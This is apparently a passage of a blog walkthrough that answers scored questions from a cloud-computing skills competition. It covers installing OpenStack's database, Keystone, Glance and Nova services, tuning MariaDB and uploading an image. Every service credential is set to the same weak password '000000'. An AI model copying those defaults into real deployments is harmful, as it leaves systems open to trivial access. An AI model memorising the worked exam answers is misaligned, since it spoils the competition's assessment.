</span></span><span class="line"><span class="cl">#Password for Keystore heat user. exmaple:000000
</span></span><span class="line"><span class="cl">HEAT_PASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#--------------------Ceilometer Config----------------##
</span></span><span class="line"><span class="cl">#Password for Gnocchi ceilometer user. exmaple:000000
</span></span><span class="line"><span class="cl">CEILOMETER_DBPASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Password for Keystore ceilometer user. exmaple:000000
</span></span><span class="line"><span class="cl">CEILOMETER_PASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#--------------------AODH Config----------------##
</span></span><span class="line"><span class="cl">#Password for Mysql AODH user. exmaple:000000
</span></span><span class="line"><span class="cl">AODH_DBPASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Password for Keystore AODH user. exmaple:000000
</span></span><span class="line"><span class="cl">AODH_PASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#--------------------ZUN Config----------------##
</span></span><span class="line"><span class="cl">#Password for Mysql ZUN user. exmaple:000000
</span></span><span class="line"><span class="cl">ZUN_DBPASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Password for Keystore ZUN user. exmaple:000000
</span></span><span class="line"><span class="cl">ZUN_PASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Password for Keystore KURYR user. exmaple:000000
</span></span><span class="line"><span class="cl">KURYR_PASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#--------------------OCTAVIA Config----------------##
</span></span><span class="line"><span class="cl">#Password for Mysql OCTAVIA user. exmaple:000000
</span></span><span class="line"><span class="cl">OCTAVIA_DBPASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Password for Keystore OCTAVIA user. exmaple:000000
</span></span><span class="line"><span class="cl">OCTAVIA_PASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#--------------------Manila Config----------------##
</span></span><span class="line"><span class="cl">#Password for Mysql Manila user. exmaple:000000
</span></span><span class="line"><span class="cl">MANILA_DBPASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Password for Keystore Manila user. exmaple:000000
</span></span><span class="line"><span class="cl">MANILA_PASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#The NODE Object Disk for Manila. example:md126p5.
</span></span><span class="line"><span class="cl">SHARE_DISK=sdc1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#--------------------Cloudkitty Config----------------##
</span></span><span class="line"><span class="cl">#Password for Mysql Cloudkitty user. exmaple:000000
</span></span><span class="line"><span class="cl">CLOUDKITTY_DBPASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Password for Keystore Cloudkitty user. exmaple:000000
</span></span><span class="line"><span class="cl">CLOUDKITTY_PASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#--------------------Barbican Config----------------##
</span></span><span class="line"><span class="cl">#Password for Mysql Barbican user. exmaple:000000
</span></span><span class="line"><span class="cl">BARBICAN_DBPASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Password for Keystore Barbican user. exmaple:000000
</span></span><span class="line"><span class="cl">BARBICAN_PASS=000000
</span></span></code></pre></td></tr></table>
</div>
</div><p>And then execute the <code>scp</code> command to copy it to the <strong>compute node</strong>, this Quiz gonna be solved!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# scp /etc/openstack/openrc.sh root@compute:/etc/openstack/openrc.sh
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<h4 id="question-5-database-installation-and-tuning-10-point"><strong>[Question 5] Database Installation and Tuning [1.0 point]</strong></h4>
<p>Use the <code>iaas-install-mysql.sh</code> script on the controller node to install services such as Mariadb, Memcached, and RabbitMQ. After installing the services, modify the <code>/etc/my.cnf</code> file to meet the following requirements:</p>
<ol>
<li>Set the database to support case sensitivity;</li>
<li>Set the cache for innodb table indexes, data, and insert data buffer to 4GB;</li>
<li>Set the database&rsquo;s log buffer to 64MB;</li>
<li>Set the size of the database&rsquo;s redo log to 256MB;</li>
<li>Set the number of redo log file groups for the database to 2. After completing the configuration, submit the username, password, and IP address of the controller node in the answer box.</li>
</ol>
</blockquote>
<p>Before we execute the <code>iaas-install-mysql.sh</code> to install services, we need to run the <code>iaas-pre-host.sh</code> script on each nodes, in order to install some packages the services need.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# cd /usr/local/bin/
</span></span><span class="line"><span class="cl">[root@controller bin]# ./iaas-pre-host.sh 
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@compute ~]# cd /usr/local/bin/
</span></span><span class="line"><span class="cl">[root@compute bin]# ./iaas-pre-host.sh 
</span></span></code></pre></td></tr></table>
</div>
</div><p>After the script finished, we need to reconnect the <code>ssh</code> shell or reboot the system of each nodes.</p>
<p>Then we can do the first step, run <code>iaas-install-mysql.sh</code> in <strong>controller node</strong>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# ./iaas-install-mysql.sh 
</span></span></code></pre></td></tr></table>
</div>
</div><p>And we edit the file <code>/etc/my.cnf</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# vim /etc/my.cnf
</span></span></code></pre></td></tr></table>
</div>
</div><p>Add these properties into it:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">lower_case_table_names = 1
</span></span><span class="line"><span class="cl">innodb_buffer_pool_size = 4G
</span></span><span class="line"><span class="cl">innodb_log_buffer_size = 64M
</span></span><span class="line"><span class="cl">innodb_log_file_size = 256M
</span></span><span class="line"><span class="cl">innodb_log_files_in_group = 2
</span></span></code></pre></td></tr></table>
</div>
</div><p>Make sure your file look like this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#
</span></span><span class="line"><span class="cl"># This group is read both both by the client and the server
</span></span><span class="line"><span class="cl"># use it for options that affect everything
</span></span><span class="line"><span class="cl">#
</span></span><span class="line"><span class="cl">[client-server]
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#
</span></span><span class="line"><span class="cl"># This group is read by the server
</span></span><span class="line"><span class="cl">#
</span></span><span class="line"><span class="cl">[mysqld]
</span></span><span class="line"><span class="cl"># Disabling symbolic-links is recommended to prevent assorted security risks
</span></span><span class="line"><span class="cl">lower_case_table_names = 1
</span></span><span class="line"><span class="cl">innodb_buffer_pool_size = 4G
</span></span><span class="line"><span class="cl">innodb_log_buffer_size = 64M
</span></span><span class="line"><span class="cl">innodb_log_file_size = 256M
</span></span><span class="line"><span class="cl">innodb_log_files_in_group = 2
</span></span><span class="line"><span class="cl">symbolic-links=0
</span></span><span class="line"><span class="cl">default-storage-engine = innodb
</span></span><span class="line"><span class="cl">innodb_file_per_table
</span></span><span class="line"><span class="cl">collation-server = utf8_general_ci
</span></span><span class="line"><span class="cl">init-connect = &#39;SET NAMES utf8&#39;
</span></span><span class="line"><span class="cl">character-set-server = utf8
</span></span><span class="line"><span class="cl">max_connections=10000
</span></span><span class="line"><span class="cl">default-storage-engine = innodb
</span></span><span class="line"><span class="cl">innodb_file_per_table
</span></span><span class="line"><span class="cl">collation-server = utf8_general_ci
</span></span><span class="line"><span class="cl">init-connect = &#39;SET NAMES utf8&#39;
</span></span><span class="line"><span class="cl">character-set-server = utf8
</span></span><span class="line"><span class="cl">max_connections=10000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#
</span></span><span class="line"><span class="cl"># include all files from the config directory
</span></span><span class="line"><span class="cl">#
</span></span><span class="line"><span class="cl">!includedir /etc/my.cnf.d
</span></span></code></pre></td></tr></table>
</div>
</div><p>Finally we Save it.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-vim" data-lang="vim"><span class="line"><span class="cl"><span class="p">:</span><span class="nx">wq</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The quiz was sovled!</p>
<blockquote>
<h4 id="question-6-keystone-service-installation-and-usage-05-points"><strong>[Question 6] Keystone Service Installation and Usage [0.5 points]</strong></h4>
<p>Use the <code>iaas-install-keystone.sh</code> script on the controller node to install the Keystone service. After installation, use the relevant commands to create a user named chinaskill with the password <code>000000</code>. Upon completion, submit the username, password, and IP address of the controller node in the answer box.</p>
</blockquote>
<p>To install the Keystone service, we need to run the <code>iaas-install-keystone.sh</code> script:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# ./iaas-install-keystone.sh
</span></span></code></pre></td></tr></table>
</div>
</div><p>If the installation is successful, the information backed should be like:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">......
</span></span><span class="line"><span class="cl">Complete!
</span></span><span class="line"><span class="cl">Created symlink from /etc/systemd/system/multi-user.target.wants/httpd.service to /usr/lib/systemd/system/httpd.service.
</span></span><span class="line"><span class="cl">+-------------+----------------------------------+
</span></span><span class="line"><span class="cl">| Field       | Value                            |
</span></span><span class="line"><span class="cl">+-------------+----------------------------------+
</span></span><span class="line"><span class="cl">| description | Default Domain                   |
</span></span><span class="line"><span class="cl">| enabled     | True                             |
</span></span><span class="line"><span class="cl">| id          | ff38535aa995441d8641b24d86881583 |
</span></span><span class="line"><span class="cl">| name        | demo                             |
</span></span><span class="line"><span class="cl">| options     | {}                               |
</span></span><span class="line"><span class="cl">| tags        | []                               |
</span></span><span class="line"><span class="cl">+-------------+----------------------------------+
</span></span><span class="line"><span class="cl">+-------------+----------------------------------+
</span></span><span class="line"><span class="cl">| Field       | Value                            |
</span></span><span class="line"><span class="cl">+-------------+----------------------------------+
</span></span><span class="line"><span class="cl">| description | Admin project                    |
</span></span><span class="line"><span class="cl">| domain_id   | ff38535aa995441d8641b24d86881583 |
</span></span><span class="line"><span class="cl">| enabled     | True                             |
</span></span><span class="line"><span class="cl">| id          | b0787807ee924b179cc02799bc595d38 |
</span></span><span class="line"><span class="cl">| is_domain   | False                            |
</span></span><span class="line"><span class="cl">| name        | myadmin                          |
</span></span><span class="line"><span class="cl">| options     | {}                               |
</span></span><span class="line"><span class="cl">| parent_id   | ff38535aa995441d8641b24d86881583 |
</span></span><span class="line"><span class="cl">| tags        | []                               |
</span></span><span class="line"><span class="cl">+-------------+----------------------------------+
</span></span><span class="line"><span class="cl">+---------------------+----------------------------------+
</span></span><span class="line"><span class="cl">| Field               | Value                            |
</span></span><span class="line"><span class="cl">+---------------------+----------------------------------+
</span></span><span class="line"><span class="cl">| domain_id           | ff38535aa995441d8641b24d86881583 |
</span></span><span class="line"><span class="cl">| enabled             | True                             |
</span></span><span class="line"><span class="cl">| id                  | 7b4df65fc3ac4d4e8a764c74f0178153 |
</span></span><span class="line"><span class="cl">| name                | myadmin                          |
</span></span><span class="line"><span class="cl">| options             | {}                               |
</span></span><span class="line"><span class="cl">| password_expires_at | None                             |
</span></span><span class="line"><span class="cl">+---------------------+----------------------------------+
</span></span><span class="line"><span class="cl">+-------------+----------------------------------+
</span></span><span class="line"><span class="cl">| Field       | Value                            |
</span></span><span class="line"><span class="cl">+-------------+----------------------------------+
</span></span><span class="line"><span class="cl">| description | Service Project                  |
</span></span><span class="line"><span class="cl">| domain_id   | ff38535aa995441d8641b24d86881583 |
</span></span><span class="line"><span class="cl">| enabled     | True                             |
</span></span><span class="line"><span class="cl">| id          | 4eca281ad75c45669f8b178f0d26944d |
</span></span><span class="line"><span class="cl">| is_domain   | False                            |
</span></span><span class="line"><span class="cl">| name        | service                          |
</span></span><span class="line"><span class="cl">| options     | {}                               |
</span></span><span class="line"><span class="cl">| parent_id   | ff38535aa995441d8641b24d86881583 |
</span></span><span class="line"><span class="cl">| tags        | []                               |
</span></span><span class="line"><span class="cl">+-------------+----------------------------------+
</span></span><span class="line"><span class="cl">+-------------+----------------------------------+
</span></span><span class="line"><span class="cl">| Field       | Value                            |
</span></span><span class="line"><span class="cl">+-------------+----------------------------------+
</span></span><span class="line"><span class="cl">| description | Demo Project                     |
</span></span><span class="line"><span class="cl">| domain_id   | ff38535aa995441d8641b24d86881583 |
</span></span><span class="line"><span class="cl">| enabled     | True                             |
</span></span><span class="line"><span class="cl">| id          | 1256dce1e4c843b99cf50e0739308313 |
</span></span><span class="line"><span class="cl">| is_domain   | False                            |
</span></span><span class="line"><span class="cl">| name        | demo                             |
</span></span><span class="line"><span class="cl">| options     | {}                               |
</span></span><span class="line"><span class="cl">| parent_id   | ff38535aa995441d8641b24d86881583 |
</span></span><span class="line"><span class="cl">| tags        | []                               |
</span></span><span class="line"><span class="cl">+-------------+----------------------------------+
</span></span><span class="line"><span class="cl">+---------------------+----------------------------------+
</span></span><span class="line"><span class="cl">| Field               | Value                            |
</span></span><span class="line"><span class="cl">+---------------------+----------------------------------+
</span></span><span class="line"><span class="cl">| domain_id           | ff38535aa995441d8641b24d86881583 |
</span></span><span class="line"><span class="cl">| enabled             | True                             |
</span></span><span class="line"><span class="cl">| id                  | c9f1413519a84c8ba0f9efd4d3f8d728 |
</span></span><span class="line"><span class="cl">| name                | demo                             |
</span></span><span class="line"><span class="cl">| options             | {}                               |
</span></span><span class="line"><span class="cl">| password_expires_at | None                             |
</span></span><span class="line"><span class="cl">+---------------------+----------------------------------+
</span></span><span class="line"><span class="cl">+-------------+----------------------------------+
</span></span><span class="line"><span class="cl">| Field       | Value                            |
</span></span><span class="line"><span class="cl">+-------------+----------------------------------+
</span></span><span class="line"><span class="cl">| description | None                             |
</span></span><span class="line"><span class="cl">| domain_id   | None                             |
</span></span><span class="line"><span class="cl">| id          | 7ad524a1308d4089a01347dbf09d2044 |
</span></span><span class="line"><span class="cl">| name        | user                             |
</span></span><span class="line"><span class="cl">| options     | {}                               |
</span></span><span class="line"><span class="cl">+-------------+----------------------------------+
</span></span><span class="line"><span class="cl">+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
</span></span><span class="line"><span class="cl">| Field      | Value                                                                                                                                                                                   |
</span></span><span class="line"><span class="cl">+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
</span></span><span class="line"><span class="cl">| expires    | 2023-05-05T14:51:32+0000                                                                                                                                                                |
</span></span><span class="line"><span class="cl">| id         | gAAAAABkVQnk9i7FQoKaw9VKNqZuEbVOmoaE-bCPPYlEy-kBqZyxOmk9o3PKLt6IxyCnfU9jO_dvd7yMpGl9LuhaXqiFHycPiIUSCoP-har-EhxmH1IUWK303DcD6jGi4GvBufnTtx7tYIIJgrA-NdMCRJu2lkSnKxCwmvI8pjz7drBwnxDl9Ps |
</span></span><span class="line"><span class="cl">| project_id | b0787807ee924b179cc02799bc595d38                                                                                                                                                        |
</span></span><span class="line"><span class="cl">| user_id    | 7b4df65fc3ac4d4e8a764c74f0178153                                                                                                                                                        |
</span></span><span class="line"><span class="cl">+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
</span></span></code></pre></td></tr></table>
</div>
</div><p>After the installation, we need to create a user named &lsquo;chinaskill&rsquo; according to the question.</p>
<p>So, first we use the <code>source</code> command to read the variables of <code>Keystone</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# source /etc/keystone/admin-openrc.sh
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then create the user by using <code>openstack</code> command</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# openstack user create --domain demo --password-prompt chinaskill
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then type the password <code>000000</code>, you will get these information:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">User Password:
</span></span><span class="line"><span class="cl">Repeat User Password:
</span></span><span class="line"><span class="cl">+---------------------+----------------------------------+
</span></span><span class="line"><span class="cl">| Field               | Value                            |
</span></span><span class="line"><span class="cl">+---------------------+----------------------------------+
</span></span><span class="line"><span class="cl">| domain_id           | ff38535aa995441d8641b24d86881583 |
</span></span><span class="line"><span class="cl">| enabled             | True                             |
</span></span><span class="line"><span class="cl">| id                  | 206814a5dfba4a9194701d124a815ca3 |
</span></span><span class="line"><span class="cl">| name                | chinaskill                       |
</span></span><span class="line"><span class="cl">| options             | {}                               |
</span></span><span class="line"><span class="cl">| password_expires_at | None                             |
</span></span><span class="line"><span class="cl">+---------------------+----------------------------------+
</span></span></code></pre></td></tr></table>
</div>
</div><p>It means that you create the user successfully! And this quiz was also solved!</p>
<blockquote>
<h4 id="question-7-glance-installation-and-usage-05-points"><strong>[Question 7] Glance Installation and Usage [0.5 points]</strong></h4>
<p>Use the <code>iaas-install-glance.sh</code> script on the <strong>controller node</strong> to install the <strong>glance service</strong>. Use the command to upload the provided <code>cirros-0.3.4-x86_64-disk.img</code> image (<strong>which is available on an HTTP service and can be downloaded independently</strong>) to the platform, name it cirros, and set the minimum required disk size for startup to <strong>10G</strong> and the minimum required memory for startup to <strong>1G</strong>. After completion, submit the username, password, and IP address of the controller node to the answer box.</p>
</blockquote>
<p>Well, it&rsquo;s a little chanllenging, isn&rsquo;t it?</p>
<p>But don&rsquo;t worry, we do the installation at first:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# ./iaas-install-glance.sh
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then we download the <code>cirros-0.3.4-x86_64-disk.img</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# cd ~
</span></span><span class="line"><span class="cl">[root@controller ~]# wget http://192.168.56.100/img/cirros-0.3.4-x86_64-disk.img
</span></span></code></pre></td></tr></table>
</div>
</div><p>Confirm the filename:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# ls -lh
</span></span><span class="line"><span class="cl">total 13M
</span></span><span class="line"><span class="cl">-rw-------. 1 root root 1.3K May  4 16:09 anaconda-ks.cfg
</span></span><span class="line"><span class="cl">-rw-r--r--  1 root root  13M Apr 27  2022 cirros-0.3.4-x86_64-disk.img
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then we execute the command to upload the image:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# openstack image create --disk-format qcow2 --container-format bare --min-disk 10 --min-ram 1024 --file ./cirros-0.3.4-x86_64-disk.img cirros
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then you will see the result returned by terminal:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
</span></span><span class="line"><span class="cl">| Field            | Value                                                                                                                                                                                      |
</span></span><span class="line"><span class="cl">+------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
</span></span><span class="line"><span class="cl">| checksum         | ee1eca47dc88f4879d8a229cc70a07c6                                                                                                                                                           |
</span></span><span class="line"><span class="cl">| container_format | bare                                                                                                                                                                                       |
</span></span><span class="line"><span class="cl">| created_at       | 2023-05-05T15:01:42Z                                                                                                                                                                       |
</span></span><span class="line"><span class="cl">| disk_format      | qcow2                                                                                                                                                                                      |
</span></span><span class="line"><span class="cl">| file             | /v2/images/62102ae0-27c3-4bc1-ad87-44be814237f4/file                                                                                                                                       |
</span></span><span class="line"><span class="cl">| id               | 62102ae0-27c3-4bc1-ad87-44be814237f4                                                                                                                                                       |
</span></span><span class="line"><span class="cl">| min_disk         | 10                                                                                                                                                                                         |
</span></span><span class="line"><span class="cl">| min_ram          | 1024                                                                                                                                                                                       |
</span></span><span class="line"><span class="cl">| name             | cirros                                                                                                                                                                                     |
</span></span><span class="line"><span class="cl">| owner            | b0787807ee924b179cc02799bc595d38                                                                                                                                                           |
</span></span><span class="line"><span class="cl">| properties       | os_hash_algo=&#39;sha512&#39;, os_hash_value=&#39;1b03ca1bc3fafe448b90583c12f367949f8b0e665685979d95b004e48574b953316799e23240f4f739d1b5eb4c4ca24d38fdc6f4f9d8247a2bc64db25d6bbdb2&#39;, os_hidden=&#39;False&#39; |
</span></span><span class="line"><span class="cl">| protected        | False                                                                                                                                                                                      |
</span></span><span class="line"><span class="cl">| schema           | /v2/schemas/image                                                                                                                                                                          |
</span></span><span class="line"><span class="cl">| size             | 13287936                                                                                                                                                                                   |
</span></span><span class="line"><span class="cl">| status           | active                                                                                                                                                                                     |
</span></span><span class="line"><span class="cl">| tags             |                                                                                                                                                                                            |
</span></span><span class="line"><span class="cl">| updated_at       | 2023-05-05T15:01:42Z                                                                                                                                                                       |
</span></span><span class="line"><span class="cl">| virtual_size     | None                                                                                                                                                                                       |
</span></span><span class="line"><span class="cl">| visibility       | shared                                                                                                                                                                                     |
</span></span><span class="line"><span class="cl">+------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
</span></span></code></pre></td></tr></table>
</div>
</div><p>It means the operation is finished and successful!</p>
<p>Now this quiz was solved!</p>
<blockquote>
<h4 id="question-8-nova-installation-and-optimization-05-points"><strong>[Question 8] Nova Installation and Optimization [0.5 points]</strong></h4>
<p>Use the <code>iaas-install-placement.sh</code>, <code>iaas-install-nova-controller.sh</code>, and <code>iaas-install-nova-compute.sh</code> scripts to install the <strong>Nova</strong> service on the <strong>controller node</strong> and <strong>compute node</strong> respectively. After installation, please modify the relevant Nova configuration files to solve the problem of virtual machine startup timeout due to long waiting time, which leads to failure to obtain IP address and error reporting. After configuring, submit the username, password, and IP address of the controller node to the answer box.</p>
</blockquote>
<p>We should run <code>iaas-install-placement.sh</code> script in controller node to install the placment service at first:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# cd /usr/local/bin/
